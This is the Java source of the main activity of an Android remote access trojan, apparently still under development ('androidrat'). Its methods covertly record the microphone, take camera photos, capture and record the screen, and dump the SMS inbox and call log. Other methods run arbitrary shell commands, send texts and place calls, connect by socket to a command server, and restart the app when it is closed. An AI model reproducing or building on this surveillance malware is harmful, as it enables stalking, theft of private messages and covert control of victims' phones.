package com.ot.androidrat;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.OperationApplicationException;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.RemoteException;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Text;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.security.Policy;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MainActivity extends AppCompatActivity {

    private static final String INBOX = "content://sms/inbox";
    private static final String SENT = "content://sms/sent";
    private static final String DRAFT = "content://sms/draft";

    private static final int MY_PERMISSIONS_REQUEST_SEND_SMS =0 ;

    private EditText command;
    private TextView shellResult;
    private Camera camera;

    private Socket ioSocket;

    @Override
    protected void onDestroy() {
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, RestartServiceReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        command = (EditText) findViewById(R.id.cmd_txt);
        shellResult = (TextView) findViewById(R.id.shell_txt);
        startService(new Intent(this, MainService.class));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void writeContact(View view){
        ArrayList contentProviderOperations = new ArrayList();
        //insert raw contact using RawContacts.CONTENT_URI
        contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null).withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null).build());
        //insert contact display name using Data.CONTENT_URI
        contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, "Contact from app").build());
        //insert mobile number using Data.CONTENT_URI
        contentProviderOperations.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0).withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, "012345678").withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE).build());
        try {
            getApplicationContext().getContentResolver().applyBatch(ContactsContract.AUTHORITY, contentProviderOperations);
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (OperationApplicationException e) {
            e.printStackTrace();
        }
    }

    public void recordMic(View view) {
        MediaRecorder recorder;
        String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".mp3";
        File audiofile = new File(mPath);
        final String TAG = "MediaRecording";
        TimerTask stopRecording;



        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        //recorder.prepare();
        recorder.start();


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();

            }
        };

        new Timer().schedule(stopRecording, 20 * 1000);
    }

    public void screenCapture(View view){

        try {
            String mPath = Environment.getExternalStorageDirectory().toString() + "/DCIM/" + System.currentTimeMillis() + ".jpg";
            Log.i("directory", mPath);
            // create bitmap screen capture
            View v1 = getWindow().getDecorView().getRootView();
            v1.setDrawingCacheEnabled(true);
            Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
            v1.setDrawingCacheEnabled(false);

            File imageFile = new File(mPath);

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            Log.i("directory", e.getMessage());
        }

    }

    public void screenRecord(View view){
        try{
            String curTime = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                curTime = LocalDateTime.now().toString();
            }
            Process su = Runtime.getRuntime().exec("screenrecord --size \"1280x720\" --time-limit 20 /storage/emulated/0/.andrat/" + curTime +".mp4");
        }catch (IOException ioException){

        }
    }

    public void ioConnection(View view){
        try{
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            ioSocket = IO.socket("http://192.168.156.11:5001/");
            ioSocket.connect();
            ioSocket.emit("pong", "pong reponse");
            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong", "pong reponse");
                    Toast.makeText(MainActivity.this, "received ping", Toast.LENGTH_LONG).show();
                }
            });
        }catch  (Exception ex){
            Log.i("Socket", ex.getMessage());
        }
    }

    public void executeShell(View view){
        try{
            Process su = Runtime.getRuntime().exec(command.getText().toString());
            StringBuilder output = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(su.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null){
                output.append(line + "\n");
            }
            shellResult.setText(output);
        }catch (IOException ioException){

        }
    }

    public void sendSMS(View view){
        String phoneNo = "+2348185571169", message = "test";
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.SEND_SMS}, MY_PERMISSIONS_REQUEST_SEND_SMS);
        }
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, message, null, null);
        }
    }

    public void call(View view){
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:" + 12345678));
        startActivity(callIntent);
    }

    public void callLog(View view){
        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = Uri.parse("content://call_log/calls");
            Cursor cur = getContentResolver().query(allCalls, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();
                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.


                call.put("phoneNo", num);
                call.put("name", name);
                call.put("duration", duration);
                call.put("type", type);
                list.put(call);

            }
            Calls.put("callsList", list);
            shellResult.setText(Calls.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void readContacts(View view) {

    }

    public void takePicture(View view){
        // 1 3 Front
        camera = Camera.open(2);
        Camera.Parameters parameters = camera.getParameters();
        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }

        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                try{
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    FileOutputStream output = new FileOutputStream(Environment.getExternalStorageDirectory().toString() + "/.andrat/"+ System.currentTimeMillis()+".jpg");
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 20, output);
                }catch(Exception ex){
                    System.out.println(ex.getMessage());
                }
            }
        });

    }

    private void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    public void findCameraList() {

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                } else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list", list);
            shellResult.setText(cameras.toString());

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public void showSMS(View view){
        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo" , address);
                sms.put("msg" , body);
                list.put(sms);

            }
            SMSList.put("smsList", list);
            Log.e("done" ,"collecting");
            shellResult.setText(SMSList.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
}